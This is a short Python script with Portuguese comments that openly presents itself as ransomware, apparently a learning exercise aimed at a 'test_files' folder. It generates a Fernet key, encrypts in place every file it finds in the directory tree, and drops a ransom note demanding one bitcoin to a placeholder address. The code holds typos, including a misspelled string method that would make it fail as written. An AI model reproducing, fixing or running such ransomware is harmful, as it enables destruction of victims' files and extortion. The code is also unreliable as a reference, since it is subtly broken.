from cryptography.fernet import Fernet
import os

#1 Gerar uma chave de criptografia e salvar
def generate_key():
    chave = Fernet.generate_key() 
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)
        
#2 Carregar a chave de criptografia
def carregar_chave():
    return open("chave.key", "rb").read()

#3 Criptografar arquivos em um diretório
def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
        dados_encriptados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)
        
#4 encotrar arquivo criptografar 
def encontrar_arquivos(diretorio):
    lista =[]
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
                caminho = os.path.join(raiz, nome)
                if nome != "ransoware.py" and not nome.endswaith(".key"):
                    lista.append(caminho)
    return lista

#5 Executar o ransomware
def criar_mensagem_resgate():
    with open("LEIA ISSO.txt", "w") as f:
        f.write("Seusu arquivo foram criptografados!\n")
        f.write("Envia 1 bitcon para o endereço X e envie o comprovante para o email Y para receber a chave de descriptografia.\n")
        f.write("Depois disso, enviaremos a chave de descriptografia.\n")
        
#6 Função principal
def main():
    generate_key()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_resgate()
    print("Ransomware executado com sucesso!")
    
if __name__ == "__main__":
    main()